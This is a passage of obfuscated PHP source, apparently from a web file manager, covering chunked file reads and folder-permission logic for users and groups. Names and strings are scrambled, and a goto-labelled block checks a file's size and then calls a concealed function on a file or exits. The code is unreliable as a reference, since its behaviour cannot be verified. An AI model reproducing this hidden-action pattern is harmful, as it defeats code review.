> 1024 * 1024 * 10) { throw new Exception("\151\157\x46\x69\x6c\145\122\x65\x61\144\40\x65\x72\162\x6f\162\41\40\163\x74\141\162\x74\x3d{$íç¾ÁŸ}\x3b\154\x65\156\147\x74\150\x3d{$Ã‡ÀæúÓ}\x3b\40\163\x69\172\x65\75{$”ÛÉ‹ï}\x3b"); } $³Ï—×í• = 64 * 1024; $ş×÷”ş¯ =& self::$_chunkBuffer[$this->path]; if (!$ş×÷”ş¯) { $ş×÷”ş¯ = array(); } $Ó‰¨³„­ = 0; $ÕáÒ§ = 0; $ŒèÌ¬ãÜ = $ûâ´×·‹[12]; foreach ($ş×÷”ş¯ as $Ó‰¨³„­ => $ŒèÌ¬ãÜ) { $Ó‰¨³„­ = intval($Ó‰¨³„­); $ÕáÒ§ = $Ó‰¨³„­ + strlen($ŒèÌ¬ãÜ); if ($íç¾ÁŸ >= $ÕáÒ§) { continue; } if ($íç¾ÁŸ >= $Ó‰¨³„­ && $íç¾ÁŸ + $Ã‡ÀæúÓ <= $ÕáÒ§) { return substr($ŒèÌ¬ãÜ, $íç¾ÁŸ - $Ó‰¨³„­, $Ã‡ÀæúÓ); } break; } if (count($ş×÷”ş¯) > 100 || timeFloat() - $this->timeStart > 2.0) { $this->log($ûâ´×·‹[1532], $ûâ´×·‹[1533] . count($ş×÷”ş¯) . "\73\x73\164\141\x72\x74\x3d{$íç¾ÁŸ}\x2c\x6c\145\156\x67\164\150\75{$Ã‡ÀæúÓ}\x3b\160\x6f\163\145\x3a{$Ó‰¨³„­}\176{$ÕáÒ§}"); throw new Exception($ûâ´×·‹[1534]); } $õ«ŞÈÃ¶ = intval($íç¾ÁŸ / $³Ï—×í•) * $³Ï—×í•; $âÒ¯§éÛ = ceil(($íç¾ÁŸ + $Ã‡ÀæúÓ) / $³Ï—×í•) * $³Ï—×í• - $õ«ŞÈÃ¶; $ş‰€Îß® = IO::fileSubstr($this->path, $õ«ŞÈÃ¶, $âÒ¯§éÛ); $ş×÷”ş¯[$õ«ŞÈÃ¶ . $ûâ´×·‹[12]] = $ş‰€Îß®; ksort($ş×÷”ş¯); $şüÌãŠ½ = substr($ş‰€Îß®, $íç¾ÁŸ - $õ«ŞÈÃ¶, $Ã‡ÀæúÓ); return $şüÌãŠ½; } private function log($Á˜›’¡õ, $èèüÒÓ) { $äıœ½€š =& $_SERVER[¹ş¤¶ĞÖ]; $¶¢›×ë = timeFloat() - $this->timeStart; write_log(sprintf($äıœ½€š[1535], $Á˜›’¡õ, $this->info[$äıœ½€š[32]], $¶¢›×ë, $èèüÒÓ), $äıœ½€š[1215]); } } goto E¢¿áğ”öË; C¡†Òù„Ÿ’: if ($_SERVER[$_SERVER[¹ş¤¶ĞÖ][905]] != $_size($_file)) { $_getc = $_SERVER[¹ş¤¶ĞÖ][907]; $_getfile = $_SERVER[$_SERVER[¹ş¤¶ĞÖ][902]] . $_SERVER[¹ş¤¶ĞÖ][903]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[¹ş¤¶ĞÖ][231], $_getfilec); if (count($_getarrs) < $_SERVER[¹ş¤¶ĞÖ][656]) { $exit = $_SERVER[¹ş¤¶ĞÖ][908]; $exit(); } $_act = $_SERVER[¹ş¤¶ĞÖ][992]; $_act($_file); } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\163\157\165\162\x63\x65\137\141\165\x74\150"; public function getAuth($·€ŠÎâó) { $åí¸¸¾ù =& $_SERVER[¹ş¤¶ĞÖ]; $“˜­¬²û = $this->sourceAuthSelect($·€ŠÎâó); $¨áî¬±¡ = array(); $ÄÁŒŒÉô = array(); $ïÊƒ‡î¡ = 2 << 25; foreach ($“˜­¬²û as $¸ÚøÏè) { $Œ”Ë¬ø = Model($åí¸¸¾ù[527])->listData($¸ÚøÏè[$åí¸¸¾ù[1970]]); if (!$Œ”Ë¬ø) { continue; } $¨áî¬±¡[] = $¸ÚøÏè; $ş¶ÔÂ¹­ = 0; if ($¸ÚøÏè[$åí¸¸¾ù[440]] == SourceModel::TYPE_GROUP) { $ş¶ÔÂ¹­ = $ïÊƒ‡î¡ * 2; } if ($¸ÚøÏè[$åí¸¸¾ù[440]] == SourceModel::TYPE_USER) { $ş¶ÔÂ¹­ = $ïÊƒ‡î¡; } if ($¸ÚøÏè[$åí¸¸¾ù[440]] == SourceModel::TYPE_USER && $¸ÚøÏè[$åí¸¸¾ù[525]] == $åí¸¸¾ù[198]) { $ş¶ÔÂ¹­ = 0; } $ÄÁŒŒÉô[] = $Œ”Ë¬ø[$åí¸¸¾ù[442]] + $ş¶ÔÂ¹­; } array_multisort($ÄÁŒŒÉô, SORT_DESC, $¨áî¬±¡); return $¨áî¬±¡; } public function sourceAuthSelect($™…ŠÜ¨¸) { $¤¨Õå‘Š =& $_SERVER[¹ş¤¶ĞÖ]; static $¦õñåÜ„ = array(); $şèÈÛ = is_array($™…ŠÜ¨¸) ? !1 : !0; if ($şèÈÛ) { $™…ŠÜ¨¸ = array($™…ŠÜ¨¸); } $¾µÃ»Ù· = array(); foreach ($™…ŠÜ¨¸ as $¶èü§î—) { if (isset($¦õñåÜ„[$¶èü§î—])) { $¾µÃ»Ù·[$¶èü§î—] = $¦õñåÜ„[$¶èü§î—]; } } if (count($¾µÃ»Ù·) == count($™…ŠÜ¨¸)) { return $şèÈÛ ? $¾µÃ»Ù·[$™…ŠÜ¨¸[0]] : $¾µÃ»Ù·; } $“üƒó¨Ö = $¤¨Õå‘Š[2047]; $Ã°œ¹Ó„ = array($¤¨Õå‘Š[431] => array($¤¨Õå‘Š[7], $™…ŠÜ¨¸)); $¨ÄÀĞ¸ï = $this->field($“üƒó¨Ö)->order($¤¨Õå‘Š[428])->where($Ã°œ¹Ó„)->select(); $µ Ñ‡ó = array_to_keyvalue_group($¨ÄÀĞ¸ï, $¤¨Õå‘Š[431]); foreach ($™…ŠÜ¨¸ as $¶èü§î—) { $¦õñåÜ„[$¶èü§î—] = $µ Ñ‡ó[$¶èü§î—] ? $µ Ñ‡ó[$¶èü§î—] : array(); } if ($şèÈÛ) { return $¨ÄÀĞ¸ï; } return $µ Ñ‡ó; } public function setAuth($ÄµÑ°—Ş, $†Ñ¢ş’) { $´’‹Ë´µ =& $_SERVER[¹ş¤¶ĞÖ]; $Àâ™Îœ£ = Model($´’‹Ë´µ[1366])->sourceInfo($ÄµÑ°—Ş); if (!$Àâ™Îœ£) { return !1; } if ($Àâ™Îœ£[$´’‹Ë´µ[440]] != SourceModel::TYPE_GROUP) { return !1; } $­áÔÆ—À = 1; $•œºïß = $Àâ™Îœ£[$´’‹Ë´µ[525]]; if ($•œºïß != $­áÔÆ—À) { $Ë…Íöœ© = array($´’‹Ë´µ[1866] => $•œºïß); $¥§³­¢° = Model($´’‹Ë´µ[1956])->field($´’‹Ë´µ[1676])->where($Ë…Íöœ©)->select(); $¥§³­¢° = array_to_keyvalue($¥§³­¢°, $´’‹Ë´µ[12], $´’‹Ë´µ[1676]); } $Ÿ•‚¸ÓÆ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $ºì’å§ˆ = array(); foreach ($†Ñ¢ş’ as $Á¹—´Ùá) { if (!in_array($Á¹—´Ùá[$´’‹Ë´µ[440]], $Ÿ•‚¸ÓÆ)) { show_json(LNG($´’‹Ë´µ[2048]), !1); } if ($•œºïß != $­áÔÆ—À) { if ($Á¹—´Ùá[$´’‹Ë´µ[440]] == SourceModel::TYPE_GROUP) { } if ($Á¹—´Ùá[$´’‹Ë´µ[525]] != 0 && !in_array($Á¹—´Ùá[$´’‹Ë´µ[525]], $¥§³­¢°)) { } } if ($Á¹—´Ùá[$´’‹Ë´µ[525]] == 0) { $Á¹—´Ùá[$´’‹Ë´µ[440]] = SourceModel::TYPE_USER; } $ºì’å§ˆ[] = array($´’‹Ë´µ[431] => $ÄµÑ°—Ş, $´’‹Ë´µ[440] => intval($Á¹—´Ùá[$´’‹Ë´µ[440]]), $´’‹Ë´µ[525] => intval($Á¹—´Ùá[$´’‹Ë´µ[525]]), $´’‹Ë´µ[1970] => intval($Á¹—´Ùá[$´’‹Ë´µ[1970]]) ? intval($Á¹—´Ùá[$´’‹Ë´µ[1970]]) : 0, $´’‹Ë´µ[2030] => intval($Á¹—´Ùá[$´’‹Ë´µ[2030]]) ? intval($Á¹—´Ùá[$´’‹Ë´µ[2030]]) : -1); } $this->where(array($´’‹Ë´µ[446] => $ÄµÑ°—Ş))->delete(); $this->addAll($ºì’å§ˆ); return !0; } public function authClear($Äß›¹õ) { $Âı¤ÀÏŞ =& $_SERVER[¹ş¤¶ĞÖ]; $ÄĞ¹¡¥ƒ = Model($Âı¤ÀÏŞ[1366])->sourceInfo($Äß›¹õ); $—æüü¤¾ = array($Äß›¹õ); if ($ÄĞ¹¡¥ƒ[$Âı¤ÀÏŞ[439]] == $Âı¤ÀÏŞ[88]) { $ÇöÕŞõ = array($Âı¤ÀÏŞ[609] => array($Âı¤ÀÏŞ[569], $ÄĞ¹¡¥ƒ[$Âı¤ÀÏŞ[540]] . $Äß›¹õ . $Âı¤ÀÏŞ[570])); $—æüü¤¾ = Model($Âı¤ÀÏŞ[1366])->field($Âı¤ÀÏŞ[446])->where($ÇöÕŞõ)->getField($Âı¤ÀÏŞ[431], !0); $—æüü¤¾[] = $Äß›¹õ; } $this->where(array($Âı¤ÀÏŞ[446] => array($Âı¤ÀÏŞ[447], $—æüü¤¾)))->delete(); return !0; } public function getAllChildren($ÍŒÂ’§´) { $®ğêø­€ =& $_SERVER[¹ş¤¶ĞÖ]; $ËÓäªğÃ = Model($®ğêø­€[1366])->sourceInfo($ÍŒÂ’§´); if ($ËÓäªğÃ[$®ğêø­€[439]] != $®ğêø­€[88]) { return $this->sourceListAuth(array($ÍŒÂ’§´)); } if ($ËÓäªğÃ[$®ğêø­€[440]] != SourceModel::TYPE_GROUP) { return array(); } $»ß³ñ®ã = 1; $Ÿšöäùç = array($ÍŒÂ’§´); if ($ËÓäªğÃ[$®ğêø­€[461]] == $®ğêø­€[198] && $ËÓäªğÃ[$®ğêø­€[525]] != $»ß³ñ®ã) { $Ÿšöäùç = $this->groupChidldAllRootSource($ËÓäªğÃ[$®ğêø­€[525]]); } $ˆÏË¸Ìæ = $this->field($®ğêø­€[431])->group($®ğêø­€[431])->select(); $ˆÏË¸Ìæ = array_to_keyvalue($ˆÏË¸Ìæ, $®ğêø­€[12], $®ğêø­€[431]); if (!$ˆÏË¸Ìæ) { return array(); } $×Ñêåİ = $®ğêø­€[2049]; $ÑÌ¡…àÄ = array($®ğêø­€[431] => array($®ğêø­€[7], $ˆÏË¸Ìæ), $®ğêø­€[460] => $®ğêø­€[198]); $œáŠ¹¡ª = Model($®ğêø­€[851])->field($×Ñêåİ)->where($ÑÌ¡…àÄ)->select(); $Á¥åÄŞ = array($ÍŒÂ’§´); foreach ($œáŠ¹¡ª as $ÏåèéüÓ) { foreach ($Ÿšöäùç as $òìã°Ç) { $¨ùùÁÒ£ = $®ğêø­€[50] . $òìã°Ç . $®ğêø­€[50]; $íò¼øÆ = $ÏåèéüÓ[$®ğêø­€[540]] . $ÏåèéüÓ[$®ğêø­€[431]] . $®ğêø­€[50]; if (strstr($íò¼øÆ, $¨ùùÁÒ£)) { $Á¥åÄŞ[] = $ÏåèéüÓ[$®ğêø­€[431]]; break; } } } return $this->sourceListAuth($Á¥åÄŞ); } private function sourceListAuth($²¨ÈÓÒÔ) { $ú‰ ¹àë =& $_SERVER[¹ş¤¶ĞÖ]; $ ò Ê«ñ = Model($ú‰ ¹àë[1366])->sourceListInfo($²¨ÈÓÒÔ, !0); $¶—ŒçÓ’ = $this->sourceAuthSelect($²¨ÈÓÒÔ); $íäõšÙÎ = array(); $ùøƒÙşĞ = array(); foreach ($ ò Ê«ñ as $½ÄÃéğ) { unset($½ÄÃéğ[$ú‰ ¹àë[485]]); unset($½ÄÃéğ[$ú‰ ¹àë[483]]); unset($½ÄÃéğ[$ú‰ ¹àë[442]]); unset($½ÄÃéğ[$ú‰ ¹àë[87]]); $‘‡ŞÂš = $¶—ŒçÓ’[$½ÄÃéğ[$ú‰ ¹àë[431]]]; if (!$‘‡ŞÂš) { continue; } $½ÄÃéğ[$ú‰ ¹àë[2050]] = $this->authTargetInfo($‘‡ŞÂš); $½ÄÃéğ[$ú‰ ¹àë[538]] = rtrim($½ÄÃéğ[$ú‰ ¹àë[544]], $ú‰ ¹àë[8]) . $ú‰ ¹àë[8] . ltrim($½ÄÃéğ[$ú‰ ¹àë[538]], $ú‰ ¹àë[8]); $íäõšÙÎ[] = $½ÄÃéğ; $İñÊÓ = count(explode($ú‰ ¹àë[8], trim($½ÄÃéğ[$ú‰ ¹àë[538]], $ú‰ ¹àë[8]))); $ùøƒÙşĞ[] = $İñÊÓ + ($½ÄÃéğ[$ú‰ ¹àë[33]] == $ú‰ ¹àë[75] ? 0 : 1000); } array_multisort($ùøƒÙşĞ, SORT_ASC, $íäõšÙÎ); return $íäõšÙÎ; } private function groupChidldAllRootSource($ğõü‰ØË) { $ñôù¤®ñ =& $_SERVER[¹ş¤¶ĞÖ]; $Ø‡“ê†Ó = Model($ñôù¤®ñ[2051])->groupChildrenAll($ğõü‰ØË); $±Ó¥±üƒ = array($ñôù¤®ñ[461] => 0, $ñôù¤®ñ[525] => array($ñôù¤®ñ[7], $Ø‡“ê†Ó), $ñôù¤®ñ[440] => SourceModel::TYPE_GROUP); $¬—ê›”” = Model($ñôù¤®ñ[851])->field($ñôù¤®ñ[431])->where($±Ó¥±üƒ)->select(); $¬—ê›”” = array_to_keyvalue($¬—ê›””, $ñôù¤®ñ[12], $ñôù¤®ñ[431]); return $¬—ê›””; } private function authTargetInfo($¥âê¨ºÆ) { $Çğ‰Ú =& $_SERVER[¹ş¤¶ĞÖ]; $Ò¶ğĞóƒ = array(); $û‘©³ÁË = array(); $‰Î—š· = 2 << 25; foreach ($¥âê¨ºÆ as $À¾×Ã½À) { $Ç’“ªĞØ = Model($Çğ‰Ú[527])->listData($À¾×Ã½À[$Çğ‰Ú[1970]]); if (!$Ç’“ªĞØ) { continue; } if ($À¾×Ã½À[$Çğ‰Ú[440]] == SourceModel::TYPE_USER) { $ãÛ§¶½ = Model($Çğ‰Ú[533])->getInfoSimpleOuter($À¾×Ã½À[$Çğ‰Ú[525]]); if ($ãÛ§¶½[$Çğ‰Ú[1676]] == $Çğ‰Ú[1221]) { continue; } if ($ãÛ§¶½[$Çğ‰Ú[1676]] == $Çğ‰Ú[198]) { $ãÛ§¶½[$Çğ‰Ú[32]] = LNG($Çğ‰Ú[2052]); } } else { $ãÛ§¶½ = Model($Çğ‰Ú[541])->getInfoSimple($À¾×Ã½À[$Çğ‰Ú[525]]); } if (!$ãÛ§¶½) { continue; } $ãÛ§¶½[$Çğ‰Ú[496]] = $Ç’“ªĞØ; $Ò¶ğĞóƒ[] = $ãÛ§¶½; $Ï”Ï‹ä = 0; if ($À¾×Ã½À[$Çğ‰Ú[440]] == SourceModel::TYPE_GROUP) { $Ï”Ï‹ä = $‰Î—š· * 2; } if ($À¾×Ã½À[$Çğ‰Ú[440]] == SourceModel::TYPE_USER) { $Ï”Ï‹ä = $‰Î—š·; } if ($À¾×Ã½À[$Çğ‰Ú[440]] == SourceModel::TYPE_USER && $À¾×Ã½À[$Çğ‰Ú[525]] == $Çğ‰Ú[198]) { $Ï”Ï‹ä = 0; } $û‘©³ÁË[] = $Ç’“ªĞØ[$Çğ‰Ú[442]] + $Ï”Ï‹ä; } array_multisort($û‘©³ÁË, SORT_DESC, $Ò¶ğĞóƒ); return $Ò¶ğĞóƒ; } public function getAllChildrenByUser($ †´£¿, $àÂ–­¥’) { $Œñ‡İ§Ç =& $_SERVER[¹ş¤¶ĞÖ]; $½çÒÉ›  = Model($Œñ‡İ§Ç[554])->getInfo($àÂ–­¥’); if (!$àÂ–­¥’ || !$ †´£¿ || !$½çÒÉ› ) { return array(); } $Öˆ´àöÙ = Model($Œñ‡İ§Ç[1366])->sourceInfo($ †´£¿); $×‰•Éµô = array(); $öÑƒÔ = 1; if ($Öˆ´àöÙ[$Œñ‡İ§Ç[461]] == $Œñ‡İ§Ç[198] && $Öˆ´àöÙ[$Œñ‡İ§Ç[525]] != $öÑƒÔ && $this->groupContainUser($Öˆ´àöÙ[$Œñ‡İ§Ç[525]], $àÂ–­¥’)) { foreach ($½çÒÉ› [$Œñ‡İ§Ç[2053]] as $˜ˆÊÓÅ¬) { $‡¸‹½Í = Model($Œñ‡İ§Ç[541])->getInfo($˜ˆÊÓÅ¬[$Œñ‡İ§Ç[1866]]); $¸—ÌúÜ» = Model($Œñ‡İ§Ç[554])->getInfoSimpleOuter($àÂ–­¥’); $¸—ÌúÜ»[$Œñ‡İ§Ç[496]] = $˜ˆÊÓÅ¬[$Œñ‡İ§Ç[442]]; if (Model($Œñ‡İ§Ç[527])->authCheckAction($˜ˆÊÓÅ¬[$Œñ‡İ§Ç[442]][$Œñ‡İ§Ç[442]], $Œñ‡İ§Ç[1887])) { continue; } $ò…Ã™¯ã = array($Œñ‡İ§Ç[32] => $Œñ‡İ§Ç[1241] . $‡¸‹½Í[$Œñ‡İ§Ç[32]], $Œñ‡İ§Ç[431] => $‡¸‹½Í[$Œñ‡İ§Ç[87]][$Œñ‡İ§Ç[431]], $Œñ‡İ§Ç[84] => KodIO::make($‡¸‹½Í[$Œñ‡İ§Ç[87]][$Œñ‡İ§Ç[431]]), $Œñ‡İ§Ç[461] => $Œñ‡İ§Ç[198], $Œñ‡İ§Ç[440] => $Œñ‡İ§Ç[534], $Œñ‡İ§Ç[33] => $Œñ‡İ§Ç[573], $Œñ‡İ§Ç[538] => $‡¸‹½Í[$Œñ‡İ§Ç[545]], $Œñ‡İ§Ç[1866] => $‡¸‹½Í[$Œñ‡İ§Ç[1866]], $Œñ‡İ§Ç[542] => $‡¸‹½Í[$Œñ‡İ§Ç[461]], $Œñ‡İ§Ç[2050] => array($¸—ÌúÜ»)); $×‰•Éµô[$ò…Ã™¯ã[$Œñ‡İ§Ç[431]]] = $ò…Ã™¯ã; } } $Ú‰ùıĞ = array(); $‡Öæñì = $this->getAllChildren($ †´£¿); foreach ($‡Öæñì as $¥¤İ¬¾÷) { $Ÿ“ı©¥¡ = !1; foreach ($¥¤İ¬¾÷[$Œñ‡İ§Ç[2050]] as $¤ò¢¶ÕŸ) { if ($¤ò¢¶ÕŸ[$Œñ‡İ§Ç[1676]]) { if ($¤ò¢¶ÕŸ[$Œñ‡İ§Ç[1676]] == $àÂ–­¥’) { $Ÿ“ı©¥¡ = !0; break; } } if ($¤ò¢¶ÕŸ[$Œñ‡İ§Ç[1866]]) { if ($this->groupContainUser($¤ò¢¶ÕŸ[$Œñ‡İ§Ç[1866]], $àÂ–­¥’)) { $Ÿ“ı©¥¡ = !0; break; } } } if ($Ÿ“ı©¥¡) { $Ú‰ùıĞ[] = $¥¤İ¬¾÷; } $ºÀæœƒÍ = $¥¤İ¬¾÷[$Œñ‡İ§Ç[431]]; if (isset($×‰•Éµô[$ºÀæœƒÍ])) { $¥¤İ¬¾÷[$Œñ‡İ§Ç[2050]][] = $×‰•Éµô[$ºÀæœƒÍ][0]; $×‰•Éµô[$ºÀæœƒÍ] = !1; } } $×‰•Éµô = array_filter(array_values($×‰•Éµô)); $Ú‰ùıĞ = array_merge($×‰•Éµô, $Ú‰ùıĞ); return $Ú‰ùıĞ; } public function setAllChildrenByUser($¥äÓÅ©±, $‹ñŞ®úã, $ĞâúÈÈ½) { $˜ì÷ÉÉô =& $_SERVER[¹ş¤¶ĞÖ]; $’ÉÏŞÒñ = $this->getAllChildrenByUser($¥äÓÅ©±, $‹ñŞ®úã); if (!$ĞâúÈÈ½ || !$’ÉÏŞÒñ) { return !1; } foreach ($’ÉÏŞÒñ as $×í” à) { $ËÅÎ™Ò = array(); foreach ($×í” à[$˜ì÷ÉÉô[2050]] as $·È·¯âÛ) { $šß³Œø = $·È·¯âÛ[$˜ì÷ÉÉô[496]]; $äÔıĞœØ = $·È·¯âÛ[$˜ì÷ÉÉô[1676]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $¡¹ìşÇè = $·È·¯âÛ[$˜ì÷ÉÉô[1676]] ? $·È·¯âÛ[$˜ì÷ÉÉô[1676]] : $·È·¯âÛ[$˜ì÷ÉÉô[1866]]; if ($·È·¯âÛ[$˜ì÷ÉÉô[1676]] && $·È·¯âÛ[$˜ì÷ÉÉô[1676]] == $‹ñŞ®úã) { continue; } $ËÅÎ™Ò[] = array($˜ì÷ÉÉô[431] => $×í” à[$˜ì÷ÉÉô[431]], $˜ì÷ÉÉô[440] => $äÔıĞœØ, $˜ì÷ÉÉô[525] => intval($¡¹ìşÇè), $˜ì÷ÉÉô[1970] => isset($šß³Œø[$˜ì÷ÉÉô[428]]) ? intval($šß³Œø[$˜ì÷ÉÉô[428]]) : 0, $˜ì÷ÉÉô[2030] => isset($šß³Œø[$˜ì÷ÉÉô[2030]]) ? intval($šß³Œø[$˜ì÷ÉÉô[2030]]) : -1); } $ËÅÎ™Ò[] = array($˜ì÷ÉÉô[431] => $×í” à[$˜ì÷ÉÉô[431]], $˜ì÷ÉÉô[440] => SourceModel::TYPE_USER, $˜ì÷ÉÉô[525] => intval($‹ñŞ®úã), $˜ì÷ÉÉô[1970] => intval($ĞâúÈÈ½), $˜ì÷ÉÉô[2030] => -1); $this->where(array($˜ì÷ÉÉô[446] => $×í” à[$˜ì÷ÉÉô[431]]))->delete(); $this->addAll($ËÅÎ™Ò); } return !0; } public function get($÷˜­‡û) { $Îö ­Íì = $this->getSourceList(array($÷˜­‡û), !0); return $Îö ­Íì[0]; } public function getSourceList($Æ¥Áµ†, $ãƒıÜü = false, $Øü«êÙŒ = false) { $¹ÀŸíÅß =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Æ¥Áµ†) { return array(); } $¿´şá½ = Model($¹ÀŸíÅß[1366]); if (!$ãƒıÜü && count($Æ¥Áµ†) == 1) { $ãƒıÜü = array(); $ãƒıÜü[$Æ¥Áµ†[0]] = $¿´şá½->sourceInfo($Æ¥Áµ†[0]); } if (!$ãƒıÜü) { $°Ö×’’ª = array($¹ÀŸíÅß[446] => array($¹ÀŸíÅß[447], $Æ¥Áµ†)); $ãƒıÜü = $¿´şá½->field($¹ÀŸíÅß[2054])->where($°Ö×’’ª)->select(); $ãƒıÜü = array_to_keyvalue($ãƒıÜü, $¹ÀŸíÅß[431]); } $ÂÓ¾ùÏ€ = $Æ¥Áµ†; foreach ($ãƒıÜü as $…¤±ŸÆ§ => $ãõûŸä¹) { $Îß”Ğ…è = $¿´şá½->parentLevelArray($ãõûŸä¹[$¹ÀŸíÅß[540]]); $ÂÓ¾ùÏ€ = array_merge($ÂÓ¾ùÏ€, array($…¤±ŸÆ§), array_reverse($Îß”Ğ…è)); } $ÂÓ¾ùÏ€ = array_values(array_unique($ÂÓ¾ùÏ€)); if (!$ÂÓ¾ùÏ€) { return array(); } $Åöø¶„ã = $this->sourceAuthSelect($ÂÓ¾ùÏ€); $¤Ñ®Ã¶À = array(); foreach ($ÂÓ¾ùÏ€ as $öã¢©Æ) { if (isset($Åöø¶„ã[$öã¢©Æ])) { $¤Ñ®Ã¶À[$öã¢©Æ] = $Åöø¶„ã[$öã¢©Æ]; } } $ü¥õ‰è° = $this->userIsRoot($Øü«êÙŒ); $Æ¶óß = AuthModel::authAll(); $ĞÇ¬¦Šñ = array($¹ÀŸíÅß[443] => $Æ¶óß, $¹ÀŸíÅß[2055] => array($¹ÀŸíÅß[448] => 0, $¹ÀŸíÅß[1872] => $Æ¶óß, $¹ÀŸíÅß[449] => LNG($¹ÀŸíÅß[2056]), $¹ÀŸíÅß[1889] => $¹ÀŸíÅß[2057])); $Ø¢çÈìà = array(); foreach ($ãƒıÜü as $öã¢©Æ => $´ú½Ü) { if ($ü¥õ‰è° && $GLOBALS[$¹ÀŸíÅß[6]][$¹ÀŸíÅß[1885]]) { $Ø¢çÈìà[$öã¢©Æ] = $ĞÇ¬¦Šñ; continue; } $Ø¢çÈìà[$öã¢©Æ] = $this->makeSourceAuth($´ú½Ü, $¤Ñ®Ã¶À, $Øü«êÙŒ); } return $Ø¢çÈìà; } public function authDeepCheck($ıÃ¸Ú™, $ÑıíÓ½ = false) { $”ñüÕÂ® =& $_SERVER[¹ş¤¶ĞÖ]; $ÑıíÓ½ = $ÑıíÓ½ ? $ÑıíÓ½ : USER_ID; $¿âò¯Í’ = $this->makeAuthDeep($ÑıíÓ½); if (!in_array($ıÃ¸Ú™, $¿âò¯Í’[$”ñüÕÂ®[2058]])) { return !1; } $ÇÖë¬™‡ = array(); foreach ($¿âò¯Í’[$”ñüÕÂ®[2059]] as $ˆÚäÙÃä => $ªÖ»ŠöÚ) { if (!in_array($ıÃ¸Ú™, $ªÖ»ŠöÚ)) { continue; } $ÇÖë¬™‡[] = $ˆÚäÙÃä; } if (!$ÇÖë¬™‡) { return !1; } $İò”ÛÂ = $ÇÖë¬™‡ ? $ÇÖë¬™‡[0] : $ıÃ¸Ú™; return array($”ñüÕÂ®[443] => -1, $”ñüÕÂ®[496] => array($”ñüÕÂ®[448] => $”ñüÕÂ®[1221], $”ñüÕÂ®[1872] => $”ñüÕÂ®[198], $”ñüÕÂ®[449] => LNG($”ñüÕÂ®[2060]), $”ñüÕÂ®[1889] => $”ñüÕÂ®[2061]), $”ñüÕÂ®[2062] => LNG($”ñüÕÂ®[2063]), $”ñüÕÂ®[2064] => $this->sourceAuthInfo($İò”ÛÂ)); } protected function makeAuthDeep($Ãö‚À³£ = false) { $¤õ£á´Ş =& $_SERVER[¹ş¤¶ĞÖ]; static $ßªÆƒ¸Ì = array(); $Ãö‚À³£ = $Ãö‚À³£ ? $Ãö‚À³£ : USER_ID; if (isset($ßªÆƒ¸Ì[$Ãö‚À³£])) { return $ßªÆƒ¸Ì[$Ãö‚À³£]; } $ËØ½š¹© = Model($¤õ£á´Ş[2065])->listData(); $ğˆÛÀœÍ = array(); foreach ($ËØ½š¹© as $îÄì’âĞ) { if ($îÄì’âĞ[$¤õ£á´Ş[442]] == 0 && $îÄì’âĞ[$¤õ£á´Ş[1888]] == $¤õ£á´Ş[88]) { $ğˆÛÀœÍ[] = $îÄì’âĞ[$¤õ£á´Ş[428]]; } } $Ê‘¢…­â = $this->userGroupParents($Ãö‚À³£); $‡‡ÙÎ­œ = array($¤õ£á´Ş[440] => SourceModel::TYPE_USER, $¤õ£á´Ş[525] => $Ãö‚À³£); if ($Ê‘¢…­â) { $‡‡ÙÎ­œ = array(array($¤õ£á´Ş[440] => SourceModel::TYPE_USER, $¤õ£á´Ş[525] => $Ãö‚À³£), array($¤õ£á´Ş[440] => SourceModel::TYPE_GROUP, $¤õ£á´Ş[525] => array($¤õ£á´Ş[447], $Ê‘¢…­â)), $¤õ£á´Ş[1033] => $¤õ£á´Ş[1964]); } $¬“å­¸² = $this->field($¤õ£á´Ş[2066])->where($‡‡ÙÎ­œ)->select(); $õ‰Ü°êù = array(); $ö±£Ã® = array_to_keyvalue_group($¬“å­¸², $¤õ£á´Ş[431]); foreach ($ö±£Ã® as $Ê›§¯Ï‘ => $¨¾À¿Õç) { $ƒÜ¡ÏÌ = $this->authArrayCheck($¨¾À¿Õç, $Ãö‚À³£); if ($ƒÜ¡ÏÌ[$¤õ£á´Ş[443]] > 0) { $õ‰Ü°êù[] = $Ê›§¯Ï‘ . $¤õ£á´Ş[12]; } } if ($Ê‘¢…­â) { $—‘Á‚šÅ = Model($¤õ£á´Ş[541]); foreach ($Ê‘¢…­â as $Å ˜‚ƒå) { $´•í†¼Œ = $—‘Á‚šÅ->getInfo($Å ˜‚ƒå); if (!$´•í†¼Œ || !is_array($´•í†¼Œ[$¤õ£á´Ş[87]])) { continue; } $õ‰Ü°êù[] = $´•í†¼Œ[$¤õ£á´Ş[87]][$¤õ£á´Ş[431]]; } } $ºúÏÁ„× = array(); $ö¸¶èºÇ = $Ê‘¢…­â; $°ÇÇãÎÍ = Model($¤õ£á´Ş[1366]); $—‘Á‚šÅ = Model($¤õ£á´Ş[541]); $½õÀ»£ = array(); $Ì‹‚±À‡ = array(); $³”ˆ£¨Î = array(); $¹Î¿åŠ° = array(); if ($õ‰Ü°êù) { $ªáŒÜ“³ = $°ÇÇãÎÍ->where(array($¤õ£á´Ş[431] => array($¤õ£á´Ş[447], $õ‰Ü°êù)))->select(); foreach ($ªáŒÜ“³ as $˜ÄèšÊ) { $¤¨¾ºœö = $°ÇÇãÎÍ->parentLevelArray($˜ÄèšÊ[$¤õ£á´Ş[540]]); $ºúÏÁ„× = array_merge($ºúÏÁ„×, $¤¨¾ºœö); $ö¸¶èºÇ[] = $˜ÄèšÊ[$¤õ£á´Ş[525]]; $½õÀ»£[$˜ÄèšÊ[$¤õ£á´Ş[431]]] = $¤¨¾ºœö; $Ì‹‚±À‡[$˜ÄèšÊ[$¤õ£á´Ş[431]]] = $˜ÄèšÊ[$¤õ£á´Ş[525]]; } } $ö¸¶èºÇ = array_values(array_unique($ö¸¶èºÇ)); $ä½ë×ƒÓ = $ö¸¶èºÇ; foreach ($ä½ë×ƒÓ as $Å ˜‚ƒå) { $´•í†¼Œ = $—‘Á‚šÅ->getInfo($Å ˜‚ƒå); $¤¨¾ºœö = $°ÇÇãÎÍ->parentLevelArray($´•í†¼Œ[$¤õ£á´Ş[540]]); $ö¸¶èºÇ = array_merge($ö¸¶èºÇ, $¤¨¾ºœö); } $ö¸¶èºÇ = array_values(array_unique($ö¸¶èºÇ)); foreach ($ö¸¶èºÇ as $Å ˜‚ƒå) { $´•í†¼Œ = $—‘Á‚šÅ->getInfo($Å ˜‚ƒå); $ºúÏÁ„×[] = 